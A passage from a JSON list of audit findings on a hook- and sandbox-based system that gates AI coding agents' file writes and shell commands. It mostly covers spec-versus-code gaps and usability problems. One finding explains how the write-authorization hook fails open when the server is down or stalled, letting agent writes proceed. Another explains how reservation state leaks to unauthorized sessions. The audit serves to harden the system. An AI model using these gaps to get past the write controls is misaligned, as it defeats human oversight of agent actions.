+  "description": "A reader of the implementation contract or coordination doc (which the project declares authoritative for shipped behavior, v1-hardening-scope-decisions.md:4-5) would believe multi-resource atomic scheduling is shipped. It is not, and the multi-path case that does exist (rename/move) is silently excluded from queue_on_conflict — an undocumented limitation.",
+  "solution": "Add the state-model.md:320-323 caveat verbatim to implementation-contract.md:209-225 and current-state-coordination.md:145-150, and document that rename/move conflicts cannot queue in v1 (or implement queueing by enqueueing both endpoint paths under one request_id with all-or-nothing promotion, the documented target model).",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Collision-domain model (hard absolute-path domain, soft repo-relative warnings) is doc-only: absolute_path is never stored, no warn decision is produced, conflicts table never written",
+  "severity": "major",
+  "area": "spec-gap",
+  "evidence": "Docs: hard conflict domain = 'same workspace_id and same normalized absolute_path' (state-model.md:171-173; implementation-contract.md:205-207; current-state-coordination.md:457-461; architecture.md:423-424); soft domain = same repo_id + relative_path 'should warn and add context' (state-model.md:175-179; current-state-coordination.md:467-474); 'Write attempts without active intent should be recorded as denied conflict checks with conflict_type: missing_intent' (state-model.md:291-292). Implementation: leases inserted with absolute_path=NULL and repo_id=NULL (store lib.rs:876-898, literal 'NULL' at :888); all conflict matching is workspace_id + relative_path (lib.rs:1165-1191). No code constructs a Warn decision (grep for Warn in policy_service.rs and policy.rs returns nothing; DecisionKind::Warn exists only as an enum variant, stateful-core/src/types.rs:126). No 'INSERT INTO conflicts' exists anywhere; the conflicts/overrides/human_observations tables are write-never. /v1/authorize output omits the documented conflicts[]/context_items[]/audit_event fields (authorization_json, server lib.rs:1094-1135 emits only decision/reason_code/message/required_next_action plus wait/reservation).",
+  "description": "The deny path approximates the hard domain via workspace-scoped relative paths (equivalent only when workspace roots are unique and symlink-free), but the entire warning tier — cross-workspace soft conflicts, branch-aware warnings, unknown-identity downgrades (current-state-coordination.md:476-487) — and the audited conflict-record trail do not exist in /v1/authorize.",
+  "solution": "Short term, restate these doc sections as target model with an explicit 'current implementation' paragraph (deny domain is workspace_id+relative_path; no warn tier; no conflict records). Medium term: populate absolute_path/repo_id at lease insert (data already flows through AuthorizeWriteInput.root/repo_id), add a soft-conflict warn check over leases(repo_id, relative_path) in PolicyService::authorize_write, and append a conflict record (or event) for every deny so the audit promise holds.",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "'events is the canonical audit log' is broken for coordination state: only 3 event types exist; leases, queue, claims, releases, and denials leave no audit trail",
+  "severity": "major",
+  "area": "spec-gap",
+  "evidence": "Promises: 'events is append-only and is the canonical audit log' (implementation-contract.md:268); 'The event log is used for audit and replay' (architecture.md:50); 'Conflict decisions must be auditable' (architecture.md:439); documented vocabulary includes LeaseAcquired, LeaseReleased, ConflictChecked, ActivityFinalized (state-model.md:466-486). Implementation: EventType has exactly SessionRegistered, SessionHeartbeat, IntentDeclared (stateful-store/src/lib.rs pub enum EventType). Lease acquire/release (lib.rs:838-901,979-1026), waiter enqueue/promotion/claim/cancel (lib.rs:1265-1344,2674-2699,1806-1828,1442-1476), and activity finalize (server lib.rs:656-698) are direct table mutations that append no events. state-model.md:489-490 only carves out 'override and human save-gate events' as unimplemented, implying the rest are emitted.",
+  "description": "Replay from the event log cannot reconstruct lease or queue state, and an authorization denial is completely invisible after the fact (no event, no conflict record, no log). The 14-day event/audit history therefore retains almost nothing of coordination interest. The doc caveat at state-model.md:489-490 materially understates the gap.",
+  "solution": "Either widen the caveat at state-model.md:489-490 and implementation-contract.md:268 to list every event kind not emitted (LeaseAcquired/Released, ConflictChecked, ActivityUpdated/Finalized, Heartbeat-named variants, outbox events, StateExpired), or route lease/queue/finalize mutations through Store::append with new event types so materialization stays transactional (the append path already exists, lib.rs:104-149).",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Fail-closed on server unavailability/timeout is delegated to unspecified runner hook-error semantics: the hook crashes instead of emitting a deny, and even read-only wrappers fail",
+  "severity": "major",
+  "area": "spec-gap",
+  "evidence": "Promises: 'A timed-out write authorization is denied' (implementation-contract.md:378-379); 'If the state server is unavailable... agent writes and reconciliation fail closed' (architecture.md:137-139, 508-541); 'Supported writes are denied' (state-model.md:538,534-552). Implementation: handle_pre_tool_use_in_repo propagates ensure_server/discover/post_json errors via `?` (hook.rs:130,150-167,1231) -> main prints the error and exits 1 with NO deny JSON on stdout (the Deny path requires exit-0 + hookSpecificOutput, hook.rs:80-93,127-134); explicit Deny is produced only for missing runtime (hook.rs:1192-1198) and HTTP non-2xx (hook.rs:1233-1247). The HTTP client has no connect timeout and sets its 5s read timeout only after the request is written (runtime.rs:442-459), so an accepting-but-stalled server hangs PreToolUse indefinitely; the 750ms authorization budget (implementation-contract.md:369-373) is implemented nowhere. The runtime targets Claude Code-style hook semantics (ClaudeCodeRuntimeAdapter hook.rs:66-78). Read-only sandbox runs also require a live server: run_sandbox_in_repo unconditionally calls ensure_server + discover_runtime before the ReadOnly branch (sandbox.rs:144-154,167-168). Joined-remote outage: ensure_server bails 'remote stateful runtime at... is unreachable... preserving runtime file' on EVERY hook event with no recovery (server_lifecycle.rs:250-255).",
+  "description": "Whether a write is blocked when the server is down/hung depends entirely on how the runner treats (a) a hook that exits non-zero with no decision output and (b) a hook that never returns. In Claude Code-style semantics a plain exit-1 is a non-blocking error and the tool proceeds — fail-OPEN for the exact case the docs promise fail-closed. Even if the runner blocks, the agent gets a raw error string with no reason_code or next action, repeated on every tool call. The documented availability carve-out 'read, search, and diff actions are allowed' is violated for shell reads: `sandbox run --fs read-only --command 'rg ...'` aborts before exec when the server is unreachable, leaving the agent with no shell during an outage. A session pointed at a dead joined remote is wedged until a human deletes ~/.stateful_core/runtime/server.json.",
+  "solution": "(a) Catch all errors in run_hook's PreToolUse arm and emit a structured Deny (exit 0) with reason_code server_unavailable and explicit recovery guidance, making fail-closed a property of the hook not the runner; (b) skip ensure_server/discover for the read-only profile (it needs neither token nor authorization) so shell inspection works offline, matching the documented availability rule; (c) add a connect timeout and an overall request deadline to post_json (runtime.rs:427-463) so authorization cannot hang past the budget, and document the enforced timeout in implementation-contract.md:369-379; (d) include 'run `stateful server status` / delete server.json / rejoin' guidance in the joined-remote-unreachable error.",
+  "sources": [
+   "spec-gap",
+   "ergonomics"
+  ]
+ },
+ {
+  "title": "Directory leases/reservations block other sessions at unlimited depth while directory intent authorizes only depth <= 2 — asymmetry documented nowhere",
+  "severity": "major",
+  "area": "spec-gap",
+  "evidence": "Promise: 'Directory intent scope permits writes only up to two path segments below that directory' (state-model.md:506-507; README.md:376-377; architecture.md:417; current-state-coordination.md:693-694) — implemented as depth 1..=2 (stateful-core/src/policy.rs:24-26,275-287). But every lease/reservation conflict query uses unlimited-depth prefix matching: `substr(?3, 1, length(relative_path) + 1) = relative_path || '/'` (store lib.rs:1180-1183 active_lease_conflict_owner_for_path, :1209-1212 active_lease_covers_path_by_session, :1709-1711 active_reservation_conflict_for_path, :959-971 acquire_lease conflicts). No doc describes a lease's blocking radius; state-model.md:120-123 describes only TTL.",
+  "description": "A session holding a write_directory lease on src/ denies other sessions' writes at src/a/b/c/d.ts (depth 4) even though no session — including the holder — could be authorized to write there under that scope (scope_mismatch at depth >= 3). The blocking radius exceeding the authorization radius is conservative but undocumented and surprising (the docs' depth-2 examples imply the lease boundary too), and inflates contention: deep-path writers queue behind a lease whose owner cannot touch their file.",
+  "solution": "Pick one semantics and document it: either bound lease/reservation conflict matching to the same depth-2 rule (compute segment count in SQL or post-filter in Rust), or add an explicit paragraph to state-model.md (Lease Record) and current-state-coordination.md stating a directory lease excludes ALL descendants regardless of the intent depth limit, with rationale.",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Retention (14 days) and configurable windows stated as live defaults but no pruning code exists; .stateful/config.yml keys are written by `stateful enable` and read by nothing",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "Stated as fact: 'Event and audit history is retained for 14 days by default... Projects may configure a longer retention window' (architecture.md:68-70; current-state-coordination.md:662-663; state-model.md:522-531). Admissions elsewhere: implementation-contract.md:488-490 'The current implementation uses built-in Rust defaults... Runtime loading of every config key and event-retention pruning are future hardening work.'; state-model.md:527 'Configurable event-retention pruning is future work.' Implementation: no DELETE/pruning of events anywhere in stateful-store/src/lib.rs (events grow unbounded); `stateful enable` writes intent_ttl_seconds/directory_scope_depth/event_retention_days into .stateful/config.yml (cli lib.rs:963-972) but no Rust code reads those keys back (grep over crates excluding tests finds only the writer); the contract admits values are built-in Rust constants (implementation-contract.md:487-488). The contract's config key list (implementation-contract.md:478-486) also omits lease_ttl_seconds and reservation TTL though those defaults are promised (implementation-contract.md:219-220).",
+  "description": "A doc-vs-doc contradiction: architecture.md and current-state-coordination.md present retention as shipped with no caveat, while the contract and state model admit it is future work. Separately, `stateful enable` materializes a config file whose edits silently do nothing — a stale-doc trap for operators tuning TTLs.",
+  "solution": "Add the 'future work' caveat to architecture.md:68-70 and current-state-coordination.md:662-663; either stop writing the unread keys in enable_repo or add a comment header in the generated config.yml stating values are informational until runtime loading ships; add lease/reservation TTLs to the contract's key list or note they are compile-time constants (stateful-store/src/lib.rs:13-17).",
+  "sources": [
+   "spec-gap",
+   "architecture"
+  ]
+ },
+ {
+  "title": "state-model.md contains a duplicated-conflicting-line editing artifact (target/ vs tmp/), and architecture.md:388 says the sandboxed-test artifact tree is target/",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "state-model.md:411-413: 'Command-shaped source writes must use exact --write-target or --create-target\\nentries, not the `target/` artifact directory scope.\\nentries, not the `tmp/` artifact directory scope.' — two alternative endings of the same sentence both committed. architecture.md:388: blocked agents may 'run sandboxed tests with the authorized `target/` artifact tree'. Ground truth: BUILD_PROFILE_WRITE_DIR = 'tmp' (sandbox.rs:26) and every other doc says tmp/ (README.md:511-512; architecture.md:280-292; implementation-contract.md:492-494; v1-hardening-scope-decisions.md:64).",
+  "description": "Doc state is incoherent on which directory the build profile authorizes; the duplicated line in state-model.md is an unresolved merge/edit artifact in a normative section. Anyone implementing against state-model.md or architecture.md's reconciliation section gets the wrong directory name.",
+  "solution": "Delete state-model.md:412 (the target/ variant), keep the tmp/ line; change architecture.md:388 to 'the authorized `tmp/` artifact tree'.",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "README wait-queue flow omits the mandatory claim stage and uses a nonexistent 'waiting' state",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "README.md:84-88: 'At the README level, the flow is intentionally simple: blocked -> waiting -> reserved -> active'. Actual statuses are queued | reserved | claimed | canceled | expired (store lib.rs:1325 inserts 'queued'; :2677-2679 'reserved'; :1820-1824 'claimed'; :1463-1466 'canceled'; :2048-2055 'expired'; state-model.md:308). concurrency-control-spec.md:364 has the correct 'blocked -> queued -> reserved -> claimed -> active'. README prose immediately after (README.md:90-95) does describe reread-then-claim correctly. The reread-then-claim semantics are kept in code (reservation_claim_required at policy_service.rs:188-200; claim at :593-646).",
+  "description": "Self-declared simplification, but the diagram drops the single most policy-relevant stage (claim — the only transition that creates write authority) and names a state ('waiting') that exists in no API response, while `stateful intent request` returns 'queued'.",
+  "solution": "Change README.md:87 to 'blocked -> queued -> reserved -> claimed (reread + claim) -> active' so the diagram matches the spec doc and the wait_queue status enum.",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "implementation-contract authorization surface doesn't match the implemented /v1/authorize API: extra actions, targets[] shape, command/override_instruction fields, and an envelope missing payload",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "implementation-contract.md:142-161 documents authorize actions 'read | search | diff | write_file | write_directory | delete_file | rename_file | move_file | bash | reconcile_ack' with a targets: array (operation/resource_type/path/old_path/new_path), command, and override_instruction. Implemented payload is flat AuthorizePayload {queue_on_conflict, purpose, action, old_path, new_path, path, base_observations} (server lib.rs struct AuthorizePayload), and anything outside the five write actions denies unsupported_action (policy_service.rs:160-170). README.md:373-374 correctly lists only the five actions. The contract's 'Common Request Envelope' (implementation-contract.md:55-80) and the 'Envelope-shaped requests include' list (:41-49) omit payload, while the implementation requires it (ProtocolEnvelope.payload, protocol.rs:6-11 — missing payload fails into protocol_mismatch) and README.md:489-490 says the envelope is required 'with payload'. /v1/conflicts/check is listed in neither the envelope-enforced nor the flat-body list (contract:36-39) though it takes a flat body (server lib.rs:771-796).",
+  "description": "The contract — declared authoritative for shipped behavior (v1-hardening-scope-decisions.md:4-5) — describes a request shape the server it specifies would reject: a client building from contract:142-161 would send targets[]/command and could omit payload, getting protocol_mismatch or unsupported_action.",
+  "solution": "Rewrite implementation-contract.md:140-161 to show the implemented flat payload (action/path/old_path/new_path/queue_on_conflict/purpose/base_observations) and mark read/search/diff/bash/reconcile_ack/targets[]/command/override_instruction as target model; add payload to both envelope listings (:41-49,:57-80); add conflicts/check to the flat-body list.",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "GET /v1/events returns the OLDEST 100 events, contradicting 'recent stored state events'; events table is never pruned",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "README.md:289 '`stateful events` prints recent stored state events.' Implementation: recent_events orders 'ORDER BY rowid ASC LIMIT ?1' (stateful-store/src/lib.rs:752-767), called with limit 100 from the /v1/events handler (server lib.rs:134-164). On an append-only, never-pruned events table (no DELETE FROM events exists anywhere) this returns the first 100 events ever written, permanently, once more than 100 exist.",
+  "description": "The only event-inspection surface stops showing anything new after the first 100 events, while being named and documented as 'recent'. Combined with no retention pruning, the audit-visibility promise degrades silently over a workspace's life.",
+  "solution": "Change the query to ORDER BY rowid DESC LIMIT ?1 (optionally re-reversing in memory for chronological display), or add an explicit cursor/limit parameter; align README.md:289 wording with the chosen behavior.",
+  "sources": [
+   "spec-gap",
+   "architecture"
+  ]
+ },
+ {
+  "title": "architecture.md lists 'Codex subagent start/stop and tool activity' as a currently implemented trigger source; no subagent hook exists",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "architecture.md:147-156 'Currently implemented trigger sources:... Codex subagent start/stop and tool activity'. The generated Codex hook config installs only SessionStart, UserPromptSubmit, PreToolUse, PostToolUse, Stop (install.rs:785-818); README.md:346-352 lists the same five. The only 'subagent' occurrence in non-test Rust is the ActorType::Subagent enum variant (stateful-core/src/types.rs:7). Subagent rules are also normative in state-model.md:383-395 (subagent writes confined to parent's intent scope, attribution to subagent actor_id) with no mechanism behind them.",
+  "description": "A reader of the architecture doc believes subagent lifecycle and attribution are wired in; nothing observes subagents, and the state-model subagent policy has no enforcement or attribution path.",
+  "solution": "Remove the subagent line from the 'currently implemented' list in architecture.md:147-156 (move it to a target/v1.5 list) and add an implementation-status note to state-model.md:383-395.",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Notification semantics undocumented: reservation_granted notifications expire after 120s (reservation TTL constant) and are redelivered on every poll until expiry",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "Promises: 'Promotion creates a short reservation and a pending notification for the waiting session' (implementation-contract.md:212-213); '/v1/notifications/poll returns pending coordination notifications' (:118-119); resume is 'notification-driven... by polling' (current-state-coordination.md:168-173). No doc states a notification lifetime or delivery semantics. Implementation: append_notification sets expires_at = now + RESERVATION_TTL_SECONDS (store lib.rs:1903), the sweep expires pending notifications (:2081-2086), and pending_notifications never marks rows consumed (:1852-1875), so the same notification repeats on every poll for <=120s then vanishes.",
+  "description": "A waiter polling slower than every 2 minutes can miss reservation_granted entirely (the reservation also expires at 120s — at least consistent), and a fast poller sees duplicates with no ack mechanism. Neither behavior is documented, so orchestration built on 'the notification and resume APIs' has no stated contract for poll frequency or dedup.",
+  "solution": "Document the 120s notification lifetime, the redelivery-until-expiry behavior, and a recommended poll interval in implementation-contract.md and current-state-coordination.md:168-182; consider a delivered/acknowledged status transition or at least a distinct NOTIFICATION_TTL constant instead of reusing RESERVATION_TTL_SECONDS.",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Context renderer Stale/Expired display rules (24h / 7d) are unreachable — the store only emits Live items; status enum mismatch ('clear' vs 'ok')",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "Promises: brief <=8 / detailed <=20 bullets, stale caps 3/10, 'Expired active records without finalization are shown for 24 hours as final status unknown... Finalized failed and blocked records are shown for 7 days' and 'status: clear | warn | blocked' (state-model.md:613-646). Implementation: caps and stale limits are exact (stateful-core/src/context.rs:243-320: 8/20 at :246-247, stale 3/10 at :303-306). But every CurrentItem the store produces is CurrentFreshness::Live (store lib.rs:452,569,694 are the only freshness constructions), so the Stale/Expired section is permanently empty and the 24h/7d windows are dead spec; ContextPackage status serializes as ok|blocked with no warn (context.rs:236-241,325-333) versus documented clear|warn|blocked.",
+  "description": "state-model.md:606-609 does say the server renders a store-backed live view, but states the stale/expired retention windows in unconditional present tense three paragraphs later. Anyone relying on 'expired-unfinalized shown 24h as final status unknown' for handoff evidence gets nothing.",
+  "solution": "Mark state-model.md:638-646 as target model (or implement: have live_current_state also emit recently-expired intents/leases with CurrentFreshness::Stale/Expired within the windows); align the status enum wording ('clear' -> 'ok', or add 'warn' to the implementation).",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Enum/schema drift between docs and code: intent status 'finalized' vs 'completed'; phase enum mismatch; wait-queue model fields absent; contract indexes cover never-populated columns",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "state-model.md:228 intent 'status: active | superseded | finalized | expired' vs complete_session_intents setting status='completed' (store lib.rs:1065-1071). state-model.md:71 phase enum '... idle | expired' vs current-state-coordination.md activity phase enum ending at 'idle'. state-model.md:300-312 wait-queue record promises queue_id, queue_sequence, blocked_by_lease_id, grant_trigger; the wait_queue schema has wait_id, rowid ordering, blocking_session_id, no grant_trigger (store lib.rs:2180-2201, insert :1309-1340). implementation-contract.md:272-288 requires indexes on events(session_id, sequence) and leases(workspace_id, absolute_path, ...) — both exist (lib.rs:2122,2174) but events.sequence is always NULL on insert (append lib.rs:108-134 never binds sequence) and leases.absolute_path is always NULL (:888), so they index nothing. events.sequence column is created but never populated.",
+  "description": "None change behavior, but they make the state model unreliable as a schema reference: status grepping for 'finalized' finds nothing, grant_trigger (a documented audit field for why promotion happened) is never recorded, and two contractually 'required' indexes cover permanently-NULL columns, falsely suggesting absolute-path and sequence-based queries exist.",
+  "solution": "Rename code status to 'finalized' or doc to 'completed'; reconcile the phase enums (or delete phase from docs until implemented); update the wait-queue record block to the actual column set or mark model-only fields; either populate events.sequence and leases.absolute_path or drop those index requirements from the contract.",
+  "sources": [
+   "spec-gap",
+   "architecture"
+  ]
+ },
+ {
+  "title": "v1-hardening-scope-decisions.md marks the 60-minute rolling intent maximum as 'Remaining' although it is implemented and tested",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "v1-hardening-scope-decisions.md:175-177 'Implement the full rolling maximum model... default rolling maximum is 60 minutes' and :238 'Remaining: add background expiration, retention pruning, and rolling maximum.' Implementation: INTENT_MAX_SECONDS = 3600 (store lib.rs:14) and refresh_session_state caps every heartbeat extension at declared_at + 3600 (lib.rs:2438-2448); implementation-contract.md:290-292 documents it as shipped.",
+  "description": "Stale in the opposite direction of most findings: the planning doc undersells shipped behavior, so a reader triaging remaining hardening work would re-plan an already-built mechanism. (Background expiration and retention pruning on the same line remain genuinely unimplemented.)",
+  "solution": "Split item 8 in v1-hardening-scope-decisions.md:238: move 'rolling maximum' to the Done list and keep background expiration + retention pruning as Remaining.",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Reservation checks run before intent validation, diverging from the documented decision order and leaking reservation existence to intent-less sessions",
+  "severity": "minor",
+  "area": "spec-gap",
+  "evidence": "concurrency-control-spec.md:319-332 decision order: (3) require active intent, (4) scope match, (5) same-session lease, (6) hard workspace conflicts. Implementation order in PolicyService::authorize_write: other-session reservation_conflict deny and own reservation_claim_required deny run FIRST (policy_service.rs:173-201), before policy_state_for_session/authorize_action (:203-217).",
+  "description": "A session with no intent probing /v1/authorize on a path learns whether another session holds a reservation there (reason_code reservation_conflict, with the reservation record in the response) instead of the documented missing_intent. Functionally still a deny, but the reason-code ordering contradicts the spec'd pipeline and discloses queue state the caller has no standing to see.",
+  "solution": "Move the reservation checks after the core intent/scope gate in authorize_write (keep reservation_claim_required after scope so the claim hint still reaches authorized owners), or amend concurrency-control-spec.md:319-332 to document reservation checks as step 2.5 and note the disclosure tradeoff.",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Flagship build/test sandbox profile breaks standard toolchains; SKILL's own canonical example fails (empirically verified)",
+  "severity": "critical",
+  "area": "ergonomics",
+  "evidence": "Build profile makes only tmp/ writable (sandbox.rs:26 BUILD_PROFILE_WRITE_DIR='tmp', 249-280); seatbelt profile denies all other writes (sandbox.rs:1293-1313); only TMPDIR/TEMP/TMP are redirected (sandbox.rs:1134-1143) — CARGO_TARGET_DIR is not. SKILL.md:67 and :89 give --command 'cargo test --workspace' as the canonical example; the per-prompt reminder repeats it (hook.rs:345). Empirical reproduction with the exact profile rules: cargo build fails 'error: failed to write .../Cargo.lock... Operation not permitted' and, with lockfile present, 'Operation not permitted (os error 1) at path \".../targetGVLl9K\"'; succeeds only with CARGO_TARGET_DIR=tmp/target. Default timeout is 300s (sandbox.rs:290). The stateful_core repo itself has target/ and no tmp/ (no cargo redirection configured).",
+  "description": "The build profile is sold as 'language-independent' (SKILL.md:17, README), but essentially every real toolchain writes inside the repo outside tmp/: cargo -> ./target + Cargo.lock, npm/yarn -> node_modules, pytest -> .pytest_cache/.coverage, go -> ./bin. The literal command the system tells agents to run on every prompt fails with an opaque OS 'Operation not permitted' from inside the sandbox (the agent gets stderr but no policy guidance, since target authorization already passed). The recovery (env-redirect each tool's cache into tmp/) is hinted only as 'direct tool-specific build caches under tmp/' with zero examples, and forces cold rebuilds into a fresh tmp/ target dir — for a medium Rust workspace that exceeds the 300s default, returning status 'timed_out' and exit 1. Three compounding failures on the single most common agent operation make first-attempt failure near-certain and multi-attempt recovery expensive.",
+  "solution": "(a) Have the build profile additionally authorize well-known cache trees (at minimum target/ for Rust, configurable per repo in .stateful/config.yml) the way tmp/ is auto-authorized; (b) auto-inject CARGO_TARGET_DIR/GOTMPDIR/npm_config_cache etc. pointing under tmp/ as the temp vars already are; (c) replace the SKILL/reminder example with one that works (--command 'CARGO_TARGET_DIR=tmp/target cargo test --workspace'); (d) raise or document the 300s default timeout next to the build examples.",
+  "sources": [
+   "ergonomics"
+  ]
+ },
+ {
+  "title": "Per-write ceremony cost: ~3 tool calls and ~17 localhost HTTP round-trips for one file edit; Stop hook wipes everything every turn",
+  "severity": "major",
+  "area": "ergonomics",
+  "evidence": "Flow: state_intent_declare + state_lease_acquire (each MCP call runs ensure_server = GET /health + GET /v1/current + GET /v1/runtime/identity: server_lifecycle.rs:119-146, mcp.rs:52-55, then 1 POST) = 8 requests; Edit PreToolUse hook = 3 health GETs + GET /v1/current?resource (hook.rs:1154-1184) + POST /v1/authorize (hook.rs:1206-1231) = 5; PostToolUse = 3 + heartbeat POST = 4. lease acquire takes a single path (stateful-mcp/src/lib.rs:177-179), so an N-file refactor needs N lease calls. Every Codex turn end fires the Stop hook (install.rs:816-821) -> /v1/activity/finalize which releases ALL session leases and completes ALL intents (server lib.rs:670-678; hook.rs:349-361). Each request is a fresh Connection: close TCP connection serialized on a global store mutex with expire_stale writes (server lib.rs:46-51).",
+  "description": "One file edit = declare -> lease -> edit (3 agent actions, 2 hook process spawns, ~17 HTTP requests). A 10-file refactor ~= 21 agent actions plus ~90 HTTP requests before any redeclaration churn. Worse, the Stop hook finalizes at the end of every assistant turn, so all intents/leases evaporate between turns: a multi-turn task re-pays the full ceremony on the first write of every turn (first edit denies missing_intent -> redeclare -> re-lease -> retry). Latency per call is tolerable locally (~50-100ms), but the failure-recovery loop and token cost of repeated denials dominate. The protocol is sustainable only for agents that have internalized the exact sequence; every deviation costs 2-4 extra tool calls.",
+  "solution": "(a) Add a composite state.work.begin {purpose, paths[]} tool that declares intent and acquires all leases in one call (and accept a paths array on lease.acquire); (b) make the hook auto-acquire the same-session lease when exact intent already covers the target; (c) make Stop finalize conditional on phase/idle rather than unconditional, or re-arm scope on the next SessionStart from the last finalized intent; (d) cache server health in the hook (trust server.json for N seconds) to cut the 3 health GETs per event.",
+  "sources": [
+   "ergonomics"
+  ]
+ },
+ {
+  "title": "Queue/claim resume protocol is not discoverable from any failure surface the agent actually sees; 120s claim window is unrealistic without a push channel",
+  "severity": "major",
+  "area": "ergonomics",
+  "evidence": "The hook parses only decision/message/required_next_action and discards wait/reservation fields (hook.rs:1242-1247,1500-1506) although /v1/authorize returns wait_id and queue_position (server lib.rs:1105-1135). active_lease_conflict guidance: 'Refresh current state, coordinate with the lease owner, or wait for the lease to release...' (policy_service.rs:300-307) — no mention of queue, poll, resume, or claim. Direct lease conflict 409: 'Requested lease conflicts with an active lease or reserved request.' with no recovery (server lib.rs:511-519). SKILL.md contains zero occurrences of claim/resume/notifications/request. Reservation guidance ('Reread X, then call state.intent.claim with wait_id Y') exists only in context render as an Info 'Nearby Activity' item (store lib.rs:667-677; context.rs:287-301), injected only on the next HUMAN prompt (hook.rs:300-331). Reservation and notification TTL are 120s (store lib.rs:16-17); an expired request_id is returned forever as 'expired' (policy_service.rs:659-682), requiring a fresh request_id at the FIFO tail.",
+  "description": "The 3-step resume protocol (poll -> reread -> claim) demands an autonomous agent spontaneously poll state_notifications_poll/state_resume_next within 120s of an event it cannot observe, after being enqueued by a denial that never told it it was enqueued (the hook drops wait_id/queue_position) and whose guidance says only to 'wait'. The one surface that explains claim (context render) fires only when the human next types a prompt — typically minutes later, past the reservation TTL — at Info severity. The realistic outcome is reservation ping-pong: each waiter's 120s reservation expires unseen, the next is promoted, also misses it, and writes proceed only by chance retry. An LLM agent will not reliably execute this protocol as shipped; even a perfectly instructed one cannot poll while mid long tool call.",
+  "solution": "(a) Surface wait_id, queue_position, and explicit 3-step instructions in the active_lease_conflict deny reason the hook emits; (b) have the PostToolUse hook piggyback pending notifications for the session into its output (it already heartbeats every tool call — a free polling channel); (c) lengthen the reservation TTL or auto-extend it while the owning session is heartbeating; (d) add a 'Wait Queue and Resume' section to SKILL.md.",
+  "sources": [
+   "ergonomics"
+  ]
+ },
+ {
+  "title": "Context render reports the agent's OWN lease as 'Blocking' with 'Required Next Action: Wait for the lease to release'",
+  "severity": "major",
+  "area": "ergonomics",
+  "evidence": "live_lease_items marks every active lease severity Block with next action 'Wait for the lease to release, or coordinate with {session}' (store lib.rs:566-579); context_render never filters by the calling session_id (server lib.rs:700-739 — session_id is not even read); any live Block item flips package status to Blocked, triggering the 'Required Next Action' section (context.rs:155-163,267-269); the UserPromptSubmit hook injects this prompt_text on every user prompt (hook.rs:300-331).",
+  "description": "The moment a solo agent completes the mandatory ceremony (declare intent, acquire lease on the file it is editing), every subsequent user prompt injects: 'Blocking — [block] src/lib.rs: Session <me> has an active write lease... Required Next Action — Wait for the lease to release, or coordinate with Session <me>'. The system's own required protocol step is presented back as a live blocker about itself. This trains agents to ignore the Blocking section (destroying its value for real conflicts) or to release/wait on their own leases mid-task. In the single-agent common case the injected coordination context is 100% false-positive noise.",
+  "solution": "Pass the calling session_id through /v1/context/render and either exclude own-session lease/intent items or render them in a separate 'Your active claims' section at Info severity; reserve Block severity + Required Next Action for items owned by OTHER sessions.",
+  "sources": [
+   "ergonomics"
+  ]
+ },
+ {
+  "title": "Blanket raw-Bash denial: near-100% first-attempt failure for habitual commands, hook-denied CLI forms the docs recommend, and a per-prompt token tax",
+  "severity": "major",
+  "area": "ergonomics",
+  "evidence": "All non-wrapper Bash denied (hook.rs:422-440, guidance blob at 589-597); SKILL.md:97 confirms even rg, git status, sed are denied raw. Outer syntax rules deny ;|&<>, backslashes, newlines, command substitution outside quotes (hook.rs:881-926), so pipelines/compound commands must be tucked inside one quoted --command and inner single-quotes require quote-concatenation. `stateful intent declare`/`intent claim`/`mcp call` CLI forms documented in README.md:290-305 are themselves hook-denied (is_stateful_control_command allows only 'server': hook.rs:861-863; SKILL.md:62 admits 'The intent declare and mcp call CLI forms are not hook-approved'). A ~120-word policy reminder is prepended to EVERY user prompt (hook.rs:333-347). mcp__filesystem__* tools are denied even for reads (hook.rs:415-417 'read-only MCP calls are not yet classified'). Read-only profile needs --network enabled just to reach the loopback server (SKILL.md:64).",
+  "description": "Every ordinary command an agent habitually emits (grep/rg, ls, sed, cat with redirection, cd && build, git status) is denied on first attempt with one generic guidance blob; the correct form is a verbose absolute-path wrapper with strict outer-quoting discipline. First-attempt failure for an untrained agent is effectively 100% (the deny IS the training signal); even trained agents fail on quoting, compound commands, and the README-documented CLI forms the hook rejects. The SKILL is load-bearing but opt-in for the model to read, contradicts README on usable command forms, omits the queue/claim/resume protocol, and ships a broken canonical build example. The unconditional per-prompt reminder (~150 tokens) plus recurring denial transcripts is a permanent context tax; usability currently depends on prompt engineering rather than a learnable, self-describing error surface.",
+  "solution": "(a) Classify and allow a small read-only Bash allowlist at the hook (rg/ls/cat/git status without redirection) or auto-rewrite simple reads into the read-only wrapper instead of denying; (b) make denials command-specific ('use <abs> sandbox run --fs git --network enabled --command \"git status\"' when argv[0]==git) rather than one generic blob; (c) align README/SKILL: remove or hook-allow the documented CLI forms (intent declare, intent claim); (d) classify mcp__filesystem__ read tools as reads; (e) gate the per-prompt reminder on the repo having had a recent denial.",
+  "sources": [
+   "ergonomics"
+  ]
+ },
+ {
+  "title": "Lease-conflict 409 on state_lease_acquire gives no recovery path",
+  "severity": "minor",
+  "area": "ergonomics",
